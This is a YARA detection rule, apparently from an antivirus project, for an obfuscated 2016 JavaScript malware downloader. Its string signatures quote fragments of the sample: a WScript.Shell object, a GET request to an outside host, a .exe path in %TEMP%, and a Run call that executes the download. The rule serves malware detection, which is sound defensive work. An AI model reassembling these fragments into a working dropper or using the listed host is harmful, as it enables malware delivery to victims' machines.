rule sig_20160328_055ee2288cc53c1d4324a8494ce91807 {
  meta:
    description = "datamaliciousorder - file 20160328_055ee2288cc53c1d4324a8494ce91807.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d9254f224c500ff9b09bdecf1821fa798d3a691833ce4b47ef5ce45825d0a853"

  strings:
    $s1  = "function Pfubipa() {return Hjqyh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xEM1vxLQqam.exe\";};" fullword ascii
    $s2  = "Dlupe[Kjdbk](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Lvziqkf](Cjrawn() * 11)} while (Dlupe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Qdvpyea(Rpwatw, Fcyimcequ){return Rpwatw - Fcyimcequ;};" fullword ascii
    $s5  = "var Hjqyh = function Onklas() {return WScript[Yfzyeh](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Tehqxaibrm() {return ((Tefhigf == true) && (Tefhigf == Tuhomifzz)) ? 1 : Yztayedf;};" fullword ascii
    $s7  = "function Edenbq(Ijaiowfhej){Hjqyh[\"Run\"](Ijaiowfhej, Yztayedf, Yztayedf);};" fullword ascii
    $s8  = "var Ijlmk = false;" fullword ascii
    $s9  = "var Tefhigf = false;" fullword ascii
    $s10 = "Tefhigf = true; " fullword ascii
    $s11 = "function Cdbqkgwig(){return Scuuoqvjsw;};" fullword ascii
    $s12 = " while (Ohnlw){" fullword ascii
    $s13 = "var Htpclkb = new this[\"Date\"]();" fullword ascii
    $s14 = "function Cjrawn(){return 22;};" fullword ascii
    $s15 = "Tuhomifzz = true; " fullword ascii
    $s16 = "function Ndiysuq(){return Yfzyeh;};" fullword ascii
    $s17 = "function Uzzsxzzjx()" fullword ascii
    $s18 = "return Qdvpyea(Vzfrmqs, Vfvsm);" fullword ascii
    $s19 = "function Cpeheefr(Urhfbiw) {var Pfbxmomuv = (1, 2, 3, 4, 5, Urhfbiw); return Pfbxmomuv;};" fullword ascii
    $s20 = "var Tuhomifzz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}